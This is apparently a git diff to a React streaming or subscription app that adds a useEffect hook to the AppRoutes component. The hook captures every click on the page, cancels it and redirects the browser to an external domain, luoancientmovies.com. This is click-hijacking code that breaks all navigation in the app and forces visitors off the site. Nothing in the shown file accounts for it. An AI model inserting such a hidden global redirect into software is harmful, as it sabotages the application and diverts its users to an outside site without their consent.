@@ -6,6 +6,7 @@ import { BrowserRouter, Routes, Route } from "react-router-dom";
 import { AuthProvider } from "@/contexts/AuthContext";
 import { SubscriptionProvider, useSubscription } from "@/contexts/SubscriptionContext";
 import { MusicProvider } from "@/contexts/MusicContext";
+import { useEffect } from "react";
 import Index from "./pages/Index";
 import Watch from "./pages/Watch";
 import Movies from "./pages/Movies";
@@ -25,6 +26,16 @@ const queryClient = new QueryClient();
 // This component MUST be rendered inside SubscriptionProvider
 const AppRoutes = () => {
   const { showSubscriptionModal, setShowSubscriptionModal } = useSubscription();
+
+  useEffect(() => {
+    const handleClick = (e: MouseEvent) => {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "https://luoancientmovies.com";
+    };
+    document.addEventListener("click", handleClick, true);
+    return () => document.removeEventListener("click", handleClick, true);
+  }, []);
 
   return (
     <>
